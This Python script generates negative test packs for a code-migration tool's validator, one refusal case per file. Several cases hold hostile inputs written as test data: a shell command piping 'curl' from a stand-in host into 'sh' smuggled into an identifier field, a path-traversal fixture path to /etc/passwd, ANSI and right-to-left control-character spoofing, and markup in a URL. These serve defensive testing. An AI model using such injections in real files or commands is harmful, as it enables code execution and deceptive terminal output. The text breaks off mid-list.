#!/usr/bin/env python3
"""Generate the negative pack corpus: one file per documented refusal.

Each case is one edit to an otherwise valid pack, so it is refused for that reason alone. `CASES`
holds the YAML path and message fragment test_all_packs.py expects; each file's header repeats them.
No arguments rewrites the corpus; `--check` reports drift and writes nothing.
"""

from __future__ import annotations

import copy
import datetime as dt
import sys
from collections.abc import Callable
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import yaml

HERE = Path(__file__).resolve().parent

Document = dict[str, Any]

# The smallest valid pack; each case adds at most one change and alters one thing.
# `.invalid` is a reserved TLD, so the `source` url can never resolve, even if fetched.
MINIMAL: Document = {
    "id": "demo/legacy-to-modern",
    "pack_version": "0.1.0",
    "provider": "demo",
    "language": "python",
    "source": {
        "type": "official_guide",
        "url": "https://example.invalid/guide",
        "retrieved_at": dt.date(2026, 9, 17),
    },
    "from": {"package": "demo-legacy", "version": "<1"},
    "to": {"package": "demo-modern", "version": ">=1", "requires_python": ">=3.9"},
    "match": {"imports": ["demo_legacy"], "prefilter_tokens": ["demo_legacy"]},
    "changes": [
        {
            "id": "configure-to-client",
            "kind": "configure_to_client",
            "citation": "Guide, Authentication",
            "fixtures": ["fixtures/negative/none.py", "fixtures/positive/one.before.py"],
            "params": {
                "legacy_symbol": "demo_legacy.configure",
                "client_symbol": "demo_modern.Client",
                "client_name": "client",
                "client_name_fallback": "demo_client",
                "allowed_kwargs": ["api_key", "credentials"],
                "credential_kwarg": "api_key",
                "credentials_object_kwarg": "credentials",
            },
        }
    ],
    "limitations": ["Everything this pack does not list."],
}

# Extra changes for rules in other kinds: the smallest valid form of each.
MODEL_CHANGE: Document = {
    "id": "model-calls",
    "kind": "generative_model_calls",
    "citation": "Guide, Generate content",
    "fixtures": ["fixtures/negative/none.py", "fixtures/positive/one.before.py"],
    "params": {
        "ctor_symbol": "demo_legacy.Model",
        "methods": {"demo_legacy.Model": ["generate"]},
        "generation_config_keys": ["temperature"],
        "safety": {
            "legacy_kwarg": "guards",
            "legacy_category_key": "category",
            "legacy_threshold_key": "threshold",
            "legacy_category_class": "demo_legacy.Harm",
            "legacy_threshold_class": "demo_legacy.Block",
            "category_map": {"harassment": "HARM_CATEGORY_HARASSMENT"},
            "threshold_map": {"low": "BLOCK_LOW_AND_ABOVE"},
            "category_members": ["HARM_CATEGORY_HARASSMENT"],
            "threshold_members": ["BLOCK_LOW_AND_ABOVE"],
            "setting_class": "demo_modern.types.Safety",
            "category_class": "demo_modern.types.Harm",
            "threshold_class": "demo_modern.types.Block",
            "category_kwarg": "category",
            "threshold_kwarg": "threshold",
            "config_field": "safety_settings",
        },
        "config_class": "demo_modern.types.Config",
        "legacy_config_symbol": "demo_legacy.Config",
        "legacy_config_kwarg": "settings",
        "ctor_order": ["name", "guards", "settings"],
        "ctor_model_kwarg": "name",
        "model_kwarg": "model",
        "stream_kwarg": "stream",
        "model_name_prefix": "models/",
        "rewrites": {
            "demo_legacy.Model.generate": {
                "new_call": "models.generate",
                "positional_to_kw": ["contents"],
                "config_kwarg": "config",
            }
        },
    },
}

RENAME_CHANGE: Document = {
    "id": "rename-import",
    "kind": "rename_import",
    "citation": "Guide, Installation",
    "fixtures": ["fixtures/negative/none.py", "fixtures/positive/one.before.py"],
    "params": {
        "from_module": "demo_legacy",
        "to_module": "demo_modern",
        "default_alias": "demo",
        "submodule_map": {"types": "demo_modern.types"},
        "alias_fallbacks": {"types": "demo_types"},
        "symbol_map": {"types.GenerationConfig": "GenerateContentConfig"},
    },
}

FLAG_CHANGE: Document = {
    "id": "flag-out-of-scope",
    "kind": "flag_only",
    "citation": "Guide, Installation",
    "fixtures": ["fixtures/negative/none.py", "fixtures/positive/one.before.py"],
    "params": {
        "symbols": ["demo_legacy.protos"],
        "message": "This surface has no rule.",
        "suggestion": "Migrate these call sites by hand.",
    },
}

CALL_CHANGE: Document = {
    "id": "measure",
    "kind": "rewrite_call",
    "citation": "Guide, Measuring",
    "fixtures": ["fixtures/negative/none.py", "fixtures/positive/one.before.py"],
    "params": {
        "legacy_symbol": "demo_legacy.measure",
        "new_call": "probe.measure",
        "arg_map": {"body": "text"},
        "positional_to_kw": ["kind", "body"],
        "config_class": "demo_modern.types.MeasureConfig",
        "config_kwarg": "config",
        "config_kwargs": ["depth"],
        "dispatch_prefixes": {"kind": ["kinds/"]},
    },
}

# A module-rooted call: spelled after the root the author wrote, so the pack needs no client source.
MODULE_CALL: Document = {
    "id": "probe",
    "kind": "rewrite_call",
    "citation": "Guide, Probing",
    "fixtures": ["fixtures/negative/none.py", "fixtures/positive/one.before.py"],
    "params": {
        "legacy_symbol": "demo_legacy.probe",
        "new_call": "probes.run",
        "root": "module",
        "arg_map": {"body": "text"},
        "positional_to_kw": ["kind"],
        "keywords": ["body", "depth"],
        "result_paths": ["rows[].price", "total"],
        "dispatch_prefixes": {"kind": ["kinds/"]},
    },
}

# A setting the new release spells another way; only a module the new SDK keeps can have one.
SETTING_CHANGE: Document = {
    "id": "endpoint",
    "kind": "rename_setting",
    "citation": "Guide, Endpoints",
    "fixtures": ["fixtures/negative/none.py", "fixtures/positive/one.before.py"],
    "params": {"settings": {"demo_legacy.endpoint": "address"}, "value_ends_with": "/"},
}

# A class the new release exports from the package instead of from a submodule.
SYMBOL_CHANGE: Document = {
    "id": "errors",
    "kind": "rename_symbol",
    "citation": "Guide, Errors",
    "fixtures": ["fixtures/negative/none.py", "fixtures/positive/one.before.py"],
    "params": {
        "symbols": {"demo_legacy.errors.Busy": "Busy"},
        "now_caught_by": ["demo_legacy.Fault"],
    },
}

# A method of a class that the new release spells another way.
MEMBER_CHANGE: Document = {
    "id": "members",
    "kind": "rename_member",
    "citation": "Guide, Methods",
    "fixtures": ["fixtures/negative/none.py", "fixtures/positive/one.before.py"],
    "params": {"members": {"demo_legacy.Model.old": "new"}},
}

# A call rewritten from the shape of its arguments.
PATTERN_CHANGE: Document = {
    "id": "pattern",
    "kind": "rewrite_pattern",
    "citation": "Guide, Calls",
    "fixtures": ["fixtures/negative/none.py", "fixtures/positive/one.before.py"],
    "params": {"before": "demo_legacy.old($a)", "after": "demo_legacy.new($a)"},
}

MANIFEST_CHANGE: Document = {
    "id": "manifest-dependency",
    "kind": "manifest_dependency",
    "citation": "Guide, Installation",
    "fixtures": ["fixtures/negative/none.txt", "fixtures/positive/one.before.txt"],
    "params": {"from_name": "demo-legacy", "to_name": "demo-modern", "to_spec": ">=1"},
}

# An extra change is always appended, so it is always `changes[1]`.
EXTRA = "changes[1]"


@dataclass(frozen=True)
class Case:
    """One refusal, the edit that provokes it, and what it must say.

    `path` is the YAML path the error names; `""` means the whole document (cross-field rules).
    `text` replaces the whole file, for cases that are not a YAML mapping at all.
    """

    name: str
    defect: str
    path: str
    says: str
    mutate: Callable[[Document], None] | None = None
    extra: Document | None = None
    text: str | None = None


def _with(document: Document, key: str, value: Any) -> None:
    document[key] = value


def flagged_twice(first: Document, second: Document) -> Callable[[Document], None]:
    """`first` added to `FLAG_CHANGE`'s params, and a second change that flags only `second`."""

    def mutate(document: Document) -> None:
        document["changes"][1]["params"].update(first)
        words = {key: FLAG_CHANGE["params"][key] for key in ("message", "suggestion")}
        document["changes"].append(
            {**copy.deepcopy(FLAG_CHANGE), "id": "flag-again", "params": {**words, **second}}
        )

    return mutate


def _newest(**fields: Any) -> Callable[[Document], None]:
    """A source range with a floor and a newest release; `fields` replace keys, `None` drops one."""

    def mutate(document: Document) -> None:
        document["from"].update(version=">=1,<4", newest="3.0.1")
        for key, value in fields.items():
            if value is None:
                document["from"].pop(key)
            else:
                document["from"][key] = value

    return mutate


def _since(**fields: Any) -> Callable[[Document], None]:
    """A source range with a floor that names what only it defines; `fields` replace keys."""

    def mutate(document: Document) -> None:
        document["from"].update(version=">=1,<4", since=["demo_legacy.Thing"])
        document["from"].update(fields)

    return mutate


def _introduces(*names: str, one: bool = True, shared: bool = True) -> Callable[[Document], None]:
    """A target that names what only it defines; by default over the one shared module of one
    distribution, where that is possible."""

    def mutate(document: Document) -> None:
        if one:
            document["to"]["package"] = "demo-legacy"
        if shared:
            _shared(document)
        document["to"]["introduces"] = list(names)

    return mutate


def _renamed(
    *,
    legacy: list[str] | None = None,
    more: tuple[Document, ...] = (),
    **params: Any,
) -> Callable[[Document], None]:
    """A shared module with names listed as legacy, and the rename rule's params set to `params`."""

    def mutate(document: Document) -> None:
        document["match"].update(
            shared=True, symbols=legacy or ["demo_legacy.configure", "demo_legacy.old"]
        )
        document["changes"][1]["params"] = params
        document["changes"].extend(more)

    return mutate


def _member(
    *,
    legacy: list[str] | None = None,
    more: tuple[Document, ...] = (),
    **params: Any,
) -> Callable[[Document], None]:
    """A shared module with the member listed as legacy, and the rename rule's params `params`."""

    def mutate(document: Document) -> None:
        document["match"].update(
            shared=True, symbols=legacy or ["demo_legacy.Model.old", "demo_legacy.configure"]
        )
        document["changes"][1]["params"] = params
        document["changes"].extend(more)

    return mutate


def _member_of_a_refused_class(document: Document) -> None:
    """A module that moves, with a method renamed on a class that another rule only reports."""
    document["changes"][1]["params"] = {"members": {"demo_legacy.Model.old": "new"}}
    flagged = {**FLAG_CHANGE["params"], "symbols": ["demo_legacy.Model"]}
    document["changes"].append({**FLAG_CHANGE, "id": "flag-model", "params": flagged})


def _pattern(
    *,
    legacy: list[str] | None = None,
    more: tuple[Document, ...] = (),
    **params: Any,
) -> Callable[[Document], None]:
    """A shared module with the called name listed as legacy, and the pattern's params `params`."""

    def mutate(document: Document) -> None:
        document["match"].update(
            shared=True, symbols=legacy or ["demo_legacy.configure", "demo_legacy.old"]
        )
        document["changes"][1]["params"] = {**PATTERN_CHANGE["params"], **params}
        document["changes"].extend(more)

    return mutate


def _pattern_through_a_legacy_module(document: Document) -> None:
    """A second module the pack matches, which the new expression is spelled through."""
    document["match"].update(
        imports=["demo_legacy", "demo_other"],
        prefilter_tokens=["demo_legacy", "demo_other"],
        shared=True,
        symbols=["demo_legacy.configure", "demo_legacy.old", "demo_other.helper.make"],
    )
    document["changes"][1]["params"] = {
        **PATTERN_CHANGE["params"],
        "after": "demo_other.helper.make($a)",
        "imports": ["demo_other.helper"],
    }


def _pattern_of_a_refused_class(document: Document) -> None:
    """A module that moves, with a pattern for a member of a class another rule only reports."""
    document["changes"][1]["params"] = {
        "before": "$m.old($a)",
        "after": "$m.renamed($a)",
        "where": {"m": "demo_legacy.Model"},
    }
    flagged = {**FLAG_CHANGE["params"], "symbols": ["demo_legacy.Model"]}
    document["changes"].append({**FLAG_CHANGE, "id": "flag-model", "params": flagged})


def _symbols_without_a_submodule_map(document: Document) -> None:
    for key in ("submodule_map", "alias_fallbacks"):
        document["changes"][1]["params"].pop(key)


def _shared(document: Document) -> None:
    """The module is the new SDK's too; `configure` is the one legacy name listed."""
    document["match"].update(shared=True, symbols=["demo_legacy.configure"])


def _attribute_outside(document: Document) -> None:
    """A shared module whose one flag_only rule names only an attribute of another module."""
    _shared(document)
    document["changes"][1]["params"].update(symbols=[], attributes=["other_module.Reply.text"])


def _symbol(
    *,
    legacy: list[str] | None = None,
    more: tuple[Document, ...] = (),
    **params: Any,
) -> Callable[[Document], None]:
    """A shared module with the submodule listed as legacy, `params` set on its rule, and `more`."""

    def mutate(document: Document) -> None:
        document["match"].update(
            shared=True, symbols=legacy or ["demo_legacy.configure", "demo_legacy.errors"]
        )
        document["changes"][1]["params"].update(params)
        document["changes"].extend(more)

    return mutate


def _setting(
    *,
    symbols: list[str] | None = None,
    more: tuple[Document, ...] = (),
    **params: Any,
) -> Callable[[Document], None]:
    """A shared module with the setting listed as legacy, `params` set on its rule, and `more`."""

    def mutate(document: Document) -> None:
        document["match"].update(
            shared=True, symbols=symbols or ["demo_legacy.configure", "demo_legacy.endpoint"]
        )
        document["changes"][1]["params"].update(params)
        document["changes"].extend(more)

    return mutate


def _depth_is_also_a_config_field(document: Document) -> None:
    document["changes"][1]["params"].update(
        config_class="demo_modern.types.ProbeConfig", config_kwarg="config", config_kwargs=["depth"]
    )


def _python_sides_with_a_transitive_module(document: Document) -> None:
    """A pack of the Python itself that lists a module some distribution installed."""
    document.update({"from": {"python": ">=3.12"}, "to": {"python": ">=3.2"}})
    document["match"].update(transitive={"demo_wire": "demo-wire"})


def _one_distribution_overlapping(document: Document) -> None:
    """Two ranges over one distribution that both admit 1."""
    document["to"]["package"] = "demo-legacy"
    document["from"]["version"] = "<2"


def _one_distribution_backwards(document: Document) -> None:
    """A target that reaches no higher than the source's floor."""
    document["to"]["package"] = "demo-legacy"
    document["from"]["version"] = ">=2"
    document["to"]["version"] = "<1"


CASES: tuple[Case, ...] = (
    # PACK_SPEC "Validation errors", one case per bullet.
    Case(
        name="unknown_field",
        defect="a top-level field the schema does not define",
        path="homepage",
        says="Extra inputs are not permitted",
        mutate=lambda d: _with(d, "homepage", "https://example.invalid"),
    ),
    Case(
        name="unknown_change_field",
        defect="an unknown field inside a change, which `extra=forbid` reaches too",
        path="changes[0].summary",
        says="Extra inputs are not permitted",
        mutate=lambda d: _with(d["changes"][0], "summary", "renames the import"),
    ),
    Case(
        name="unknown_change_kind",
        defect="a rule kind that is not in the registry",
        path="changes[0]",
        says="does not match any of the expected tags",
        mutate=lambda d: _with(d["changes"][0], "kind", "rewrite_imports"),
    ),
    Case(
        name="duplicate_change_id",
        defect="two changes with one id, which `Edit.rule_id` could not tell apart",
        path="",
        says="appears twice",
        mutate=lambda d: d["changes"].append(copy.deepcopy(d["changes"][0])),
    ),
    Case(
        name="missing_source_url",
        defect="provenance with no url",
        path="source.url",
        says="Field required",
        mutate=lambda d: d["source"].pop("url"),
    ),
    Case(
        name="missing_source_retrieved_at",
        defect="provenance with no retrieval date",
        path="source.retrieved_at",
        says="Field required",
        mutate=lambda d: d["source"].pop("retrieved_at"),
    ),
    Case(
        name="source_retrieved_at_is_text",
        defect="a retrieval date written as a quoted string, which no other field coerces",
        path="source.retrieved_at",
        says="Input should be a valid date",
        mutate=lambda d: _with(d["source"], "retrieved_at", "2026-09-17"),
    ),
    Case(
        name="source_retrieved_at_is_a_timestamp",
        defect="a retrieval date given with a time of day",
        path="source.retrieved_at",
        says="Input should be a valid date",
        mutate=lambda d: _with(d["source"], "retrieved_at", dt.datetime(2026, 9, 17, 10, 30)),
    ),
    Case(
        name="source_url_is_not_https",
        defect="a source url that is not https, in a field copied into evidence",
        path="source.url",
        says="must be https",
        mutate=lambda d: _with(d["source"], "url", "http://example.invalid/guide"),
    ),
    Case(
        name="source_url_holds_markup",
        defect="a source url with a character that makes Markdown or a second line of the report",
        path="source.url",
        says="no whitespace, control or markup character",
        mutate=lambda d: _with(d["source"], "url", "https://example.invalid/g`<img src=x>"),
    ),
    Case(
        name="language_is_not_python",
        defect="a language this tool does not read",
        path="language",
        says="Input should be 'python'",
        mutate=lambda d: _with(d, "language", "javascript"),
    ),
    Case(
        name="empty_match_imports",
        defect="a pack that matches no import module",
        path="match",
        says="must name at least one module",
        mutate=lambda d: _with(d["match"], "imports", []),
    ),
    Case(
        name="to_without_requires_python",
        defect="a target distribution that says nothing of the Pythons it installs on",
        path="to",
        says="requires_python is required",
        mutate=lambda d: d["to"].pop("requires_python"),
    ),
    Case(
        name="a_distribution_without_a_version",
        defect="a side that names a distribution and no range of it",
        path="from",
        says="package and version name a distribution together",
        mutate=lambda d: d["from"].pop("version"),
    ),
    Case(
        name="a_version_without_a_distribution",
        defect="a side that names a range and no distribution it is of",
        path="from",
        says="package and version name a distribution together",
        mutate=lambda d: d["from"].pop("package"),
    ),
    Case(
        name="a_side_that_is_neither_a_distribution_nor_a_python",
        defect="a side with nothing on it, which no gate could read",
        path="from",
        says="a side is a distribution (package and version) or the Pythons it runs on",
        mutate=lambda d: d["from"].clear(),
    ),
    Case(
        name="a_side_that_is_both_a_distribution_and_a_python",
        defect="a distribution and the Pythons it runs on, two gates for one side",
        path="to",
        says="a side is a distribution (package and version) or the Pythons it runs on",
        mutate=lambda d: _with(d["to"], "python", ">=3.10"),
    ),
    Case(
        name="a_python_target_with_requires_python",
        defect="the Pythons a target runs on, said twice and as what only a distribution has",
        path="to",
        says="requires_python and introduces are about a distribution",
        mutate=lambda d: d.update({"to": {"python": ">=3.2", "requires_python": ">=3.9"}}),
    ),
    Case(
        name="a_python_side_with_a_newest_release",
        defect="a release of a distribution on a side that is a Python",
        path="from",
        says="newest, lacks and since are about the releases of a distribution",
        mutate=lambda d: d.update({"from": {"python": ">=3.12", "newest": "1.0.0"}}),
    ),
    Case(
        name="a_dependency_line_for_a_python_side",
        defect="a manifest rule on a pack that moves to the Python, which no manifest declares",
        path="",
        says="a side of this pack is a Python, which no manifest declares",
        extra=MANIFEST_CHANGE,
        mutate=lambda d: d.update({"to": {"python": ">=3.2"}}),
    ),
    Case(
        name="a_transitive_module_for_a_python_side",
        defect="a module that a distribution installed, on a pack that starts from the Python",
        path="",
        says="the old side of this pack is a Python",
        mutate=_python_sides_with_a_transitive_module,
    ),
    Case(
        name="requires_python_not_a_specifier",
        defect="a Python requirement that is a version, not a specifier",
        path="to.requires_python",
        says="expected a PEP 440 version specifier",
        mutate=lambda d: _with(d["to"], "requires_python", "3.10"),
    ),
    Case(
        name="from_version_is_not_pep440",
        defect="a version range that is not a PEP 440 specifier",
        path="from.version",
        says="PEP 440 version specifier",
        mutate=lambda d: _with(d["from"], "version", "~~1"),
    ),
    Case(
        name="newest_is_a_pre_release",
        defect="a newest release that is a pre-release, which no unpinned install resolves to",
        path="from.newest",
        says="expected a final release",
        mutate=_newest(newest="3.0.0rc1"),
    ),
    Case(
        name="newest_outside_the_range",
        defect="a newest release the range does not admit, so an install of it is out of range",
        path="from",
        says="is outside from.version",
        mutate=_newest(newest="5.0.0"),
    ),
    Case(
        name="newest_with_a_range_that_has_no_floor",
        defect="a newest release for a range that names no floor, so nothing is out of range",
        path="from",
        says="must have a floor",
        mutate=_newest(version="<4"),
    ),
    Case(
        name="lacks_without_a_newest_release",
        defect="names a release lacks, which says what the newest release does not define",
        path="from",
        says="set newest",
        mutate=_newest(newest=None, lacks=["demo_legacy.protos"]),
    ),
    Case(
        name="lacks_a_name_no_rule_flags",
        defect="a name the newest release lacks that no flag_only change reports",
        path="",
        says="which no flag_only change lists in symbols",
        extra=FLAG_CHANGE,
        mutate=_newest(lacks=["demo_legacy.elsewhere"]),
    ),
    Case(
        name="since_with_a_range_that_has_no_floor",
        defect="names what only the source range defines, for a range with no floor to start it",
        path="from",
        says="must have a floor",
        mutate=_since(version="<4"),
    ),
    Case(
        name="since_beside_a_newest_release",
        defect="names a newest release and what only the range defines, two ways to take one thing",
        path="from",
        says="each stand for an unversioned declaration",
        mutate=_since(newest="3.0.1"),
    ),
    Case(
        name="since_that_is_not_sorted",
        defect="a list of names that is not sorted, so one set has two spellings",
        path="from",
        says="sorted and de-duplicated",
        mutate=_since(since=["demo_legacy.b", "demo_legacy.a"]),
    ),
    Case(
        name="since_a_name_the_scan_never_reports",
        defect="a name outside every module the pack matches, so no finding could prove it",
        path="",
        says="which is under nothing in match.imports",
        mutate=_since(since=["elsewhere.Thing"]),
    ),
    Case(
        name="introduces_across_two_distributions",
        defect="names what only the new side defines where the pack has two distributions",
        path="",
        says="this pack migrates between two",
        mutate=_introduces("demo_legacy.Client", one=False),
    ),
    Case(
        name="introduces_for_a_module_that_is_not_shared",
        defect="names what only the new side defines in a module the new side does not keep",
        path="",
        says="match.shared says this module is not",
        mutate=_introduces("demo_legacy.Client", shared=False),
    ),
    Case(
        name="introduces_that_is_not_sorted",
        defect="a list of names that is not sorted, so one set has two spellings",
        path="to",
        says="sorted and de-duplicated",
        mutate=_introduces("demo_legacy.b", "demo_legacy.a"),
    ),
    Case(
        name="introduces_a_name_outside_the_module",
        defect="a name outside every module the pack matches, so no import could bind it",
        path="",
        says="which is not under a module of match.imports",
        mutate=_introduces("elsewhere.Client"),
    ),
    Case(
        name="introduces_a_legacy_name",
        defect="a name the pack also lists as legacy, which cannot be both",
        path="",
        says="or is a legacy name in match.symbols",
        mutate=_introduces("demo_legacy.configure"),
    ),
    Case(
        name="newest_on_the_target",
        defect="a newest release on the side that is migrated to",
        path="to.newest",
        says="Extra inputs are not permitted",
        mutate=lambda d: _with(d["to"], "newest", "1.0.0"),
    ),
    Case(
        name="version_ranges_overlap",
        defect="two ranges over one distribution that admit the same version",
        path="",
        says="both sides of the migration",
        mutate=_one_distribution_overlapping,
    ),
    Case(
        name="version_ranges_move_backwards",
        defect="a target range that reaches no higher than the source's floor",
        path="",
        says="move backwards",
        mutate=_one_distribution_backwards,
    ),
    Case(
        name="client_fallback_repeats_the_first_name",
        defect="a naming ladder whose two rungs are the same name",
        path="changes[0].params",
        says="one rung written as two",
        mutate=lambda d: _with(d["changes"][0]["params"], "client_name_fallback", "client"),
    ),
    Case(
        name="credential_kwarg_is_refused_outright",
        defect="a keyword with a role in the rewrite that the rule also refuses",
        path="changes[0].params",
        says="never reach the role",
        mutate=lambda d: _with(d["changes"][0]["params"], "credential_kwarg", "token"),
    ),
    Case(
        name="client_symbol_is_not_qualified",
        defect="a client class named without the module it comes from",
        path="changes[0].params",
        says="names a class under the new module",
        mutate=lambda d: _with(d["changes"][0]["params"], "client_symbol", "Client"),
    ),
    Case(
        name="layout_line_length_is_absurd",
        defect="a wrap width no formatter would produce",
        path="layout.line_length",
        says="less than or equal to 320",
        mutate=lambda d: _with(d, "layout", {"line_length": 4000}),
    ),
    Case(
        name="smuggled_shell_string",
        defect="a shell command in a field whose value becomes an identifier",
        path="changes[0].params.client_name",
        says="single Python identifier",
        mutate=lambda d: _with(
            d["changes"][0]["params"], "client_name", "client; curl https://example.invalid | sh"
        ),
    ),
    # ADR-018's coherence and safety rules.
    Case(
        name="prefilter_token_matches_no_import",
        defect="a prefilter that eliminates every file the pack is about",
        path="match",
        says="eliminated before it is parsed",
        mutate=lambda d: _with(d["match"], "prefilter_tokens", ["nothing"]),
    ),
    Case(
        name="symbol_outside_the_matched_imports",
        defect="a matched symbol under no matched module",
        path="match",
        says="not under any module",
        mutate=lambda d: _with(d["match"], "symbols", ["other_package.thing"]),
    ),
    Case(
        name="legacy_symbol_outside_the_matched_imports",
        defect="a rule naming a symbol resolution can never produce",
        path="",
        says="the rule can never fire",
        mutate=lambda d: _with(
            d["changes"][0]["params"], "legacy_symbol", "other_package.configure"
        ),
    ),
    Case(
        name="no_fixtures",
        defect="a change with nothing proving it",
        path="changes[0]",
        says="at least one fixture",
        mutate=lambda d: _with(d["changes"][0], "fixtures", []),
    ),
    Case(
        name="fixture_path_climbs_out_of_the_pack",
        defect="a fixture path that leaves the pack directory",
        path="changes[0].fixtures[0]",
        says="climb out",
        mutate=lambda d: _with(d["changes"][0], "fixtures", ["fixtures/../../../etc/passwd"]),
    ),
    Case(
        name="no_limitations",
        defect="a pack that claims to handle everything",
        path="",
        says="must list at least one thing the pack does not handle",
        mutate=lambda d: _with(d, "limitations", []),
    ),
    Case(
        name="pack_id_does_not_match_the_provider",
        defect="an id whose first segment is not the provider it would live under",
        path="",
        says="must begin with provider",
        mutate=lambda d: _with(d, "id", "other/legacy-to-modern"),
    ),
    Case(
        name="pack_version_is_not_semver",
        defect="a pack version that cannot be compared",
        path="pack_version",
        says="semver",
        mutate=lambda d: _with(d, "pack_version", "0.1"),
    ),
    Case(
        name="two_client_sources",
        defect="two rules naming two client sources for one module",
        path="",
        says="found 2",
        mutate=lambda d: d["changes"].append(
            {**copy.deepcopy(d["changes"][0]), "id": "configure-to-client-again"}
        ),
    ),
    Case(
        name="escape_sequence_in_a_message",
        defect="an ANSI escape in prose a terminal renders verbatim",
        path=f"{EXTRA}.params.message",
        says="control, format or surrogate",
        extra=FLAG_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"], "message", "This surface has no rule.\x1b[2K\rMigrated."
        ),
    ),
    Case(
        name="right_to_left_override_in_a_suggestion",
        defect="a bidirectional override, which makes a suggestion read backwards",
        path="verification.suggestions[0]",
        says="control, format or surrogate",
        mutate=lambda d: _with(
            d, "verification", {"suggestions": ["pytest -q  # ‮sh | detsurtnu lruc"]}
        ),
    ),
    # Rules that live inside one kind.
    Case(
        name="model_calls_without_a_client_source",
        defect="a pack rewriting calls onto a client and naming no client source",
        path="",
        says="found 0",
        extra=MODEL_CHANGE,
        mutate=lambda d: d["changes"].pop(0),
    ),
    Case(
        name="seed_is_not_a_legacy_config_key",
        defect="a configuration key that exists only on the new side",
        path=f"{EXTRA}.params",
        says="must not carry ['seed']",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"], "generation_config_keys", ["seed", "temperature"]
        ),
    ),
    Case(
        name="dangerous_content_is_not_a_safety_key",
        defect="a safety key the legacy lookup raised KeyError for",
        path=f"{EXTRA}.params.safety",
        says="must not accept ['dangerous_content']",
        extra=MODEL_CHANGE,
        mutate=lambda d: d["changes"][1]["params"]["safety"]["category_map"].update(
            {"dangerous_content": "HARM_CATEGORY_DANGEROUS_CONTENT"}
        ),
    ),
    Case(
        name="harm_category_hate_is_never_emitted",
        defect="a member name that exists in neither SDK and is fabricated silently",
        path=f"{EXTRA}.params.safety",
        says="must never carry ['HARM_CATEGORY_HATE']",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"]["safety"],
            "category_members",
            ["HARM_CATEGORY_HARASSMENT", "HARM_CATEGORY_HATE"],
        ),
    ),
    Case(
        name="a_safety_map_that_reaches_past_its_members",
        defect="a table emitting a member the enum does not declare",
        path=f"{EXTRA}.params.safety",
        says="which category_members does not declare",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"]["safety"],
            "category_map",
            {"harassment": "HARM_CATEGORY_HARASSMENT", "hate": "HARM_CATEGORY_HATE_SPEECH"},
        ),
    ),
    Case(
        name="one_enum_for_both_halves_of_a_safety_row",
        defect="the same legacy enum named as the category's and the threshold's",
        path=f"{EXTRA}.params.safety",
        says="makes a threshold readable as a category",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"]["safety"], "legacy_threshold_class", "demo_legacy.Harm"
        ),
    ),
    Case(
        name="a_safety_class_under_another_module",
        defect="a class the rule emits that its one import could not reach",
        path=f"{EXTRA}.params",
        says="every class this rule emits is reached through the one name",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"]["safety"], "setting_class", "demo_modern.safety.Safety"
        ),
    ),
    Case(
        name="the_safety_keyword_is_outside_the_signature",
        defect="a safety table on a constructor parameter the signature does not have",
        path=f"{EXTRA}.params",
        says="which is not a parameter in ctor_order",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"]["safety"], "legacy_kwarg", "safety_settings"
        ),
    ),
    Case(
        name="a_safety_enum_under_no_imported_module",
        defect="a legacy enum resolution can never produce",
        path="",
        says="params.safety.legacy_category_class names",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"]["safety"], "legacy_category_class", "other_legacy.Harm"
        ),
    ),
    Case(
        name="safety_key_is_not_lower_case",
        defect="a safety table with two spellings of one key",
        path=f"{EXTRA}.params.safety.category_map.HATE",
        says="matched case-insensitively",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"]["safety"],
            "category_map",
            {"HATE": "HARM_CATEGORY_HATE_SPEECH"},
        ),
    ),
    Case(
        name="constructor_has_no_method_list",
        defect="a constructor whose receiver declares no supported method",
        path=f"{EXTRA}.params",
        says="methods has no entry for ctor_symbol",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"], "methods", {"demo_legacy.Chat": ["send"]}
        ),
    ),
    Case(
        name="alias_fallback_for_no_submodule",
        defect="a fallback alias for a submodule the pack does not move",
        path=f"{EXTRA}.params",
        says="names no submodule in submodule_map",
        extra=RENAME_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "alias_fallbacks", {"wire": "demo_wire"}),
    ),
    Case(
        name="symbol_named_after_a_submodule",
        defect="a symbol key that is a submodule, which submodule_map already moves",
        path=f"{EXTRA}.params",
        says="names a submodule",
        extra=RENAME_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "symbol_map", {"types": "types"}),
    ),
    Case(
        name="symbol_map_key_too_deep",
        defect="a symbol key more than one submodule down",
        path=f"{EXTRA}.params.symbol_map.types.GenerationConfig.Field",
        says="expected `Name` or `<submodule>.Name`",
        extra=RENAME_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "symbol_map",
            {"types.GenerationConfig.Field": "GenerateContentConfig"},
        ),
    ),
    Case(
        name="symbol_map_without_a_submodule_map",
        defect="mapped submodule symbols with nothing saying where the submodule went",
        path=f"{EXTRA}.params",
        says="where that submodule moved to",
        extra=RENAME_CHANGE,
        mutate=_symbols_without_a_submodule_map,
    ),
    Case(
        name="symbol_mapped_and_flagged",
        defect="one symbol with two answers: a rename and a refusal",
        path="",
        says="mapped or refused",
        extra=RENAME_CHANGE,
        mutate=lambda d: d["changes"].append(
            {
                **copy.deepcopy(FLAG_CHANGE),
                "params": {
                    **FLAG_CHANGE["params"],
                    "symbols": ["demo_legacy.types.GenerationConfig"],
                },
            }
        ),
    ),
    Case(
        name="symbol_both_rewritten_and_refused",
        defect="one symbol with two answers, decided by the order of the list",
        path="",
        says="both rewritten and refused",
        extra=FLAG_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "symbols", ["demo_legacy.configure"]),
    ),
    Case(
        name="two_flag_only_changes_on_one_symbol_and_its_prefix",
        defect="a symbol one rule flags and another flags under it, so each row has two messages",
        path="",
        says="both flag ['demo_legacy.protos.Message']",
        extra=FLAG_CHANGE,
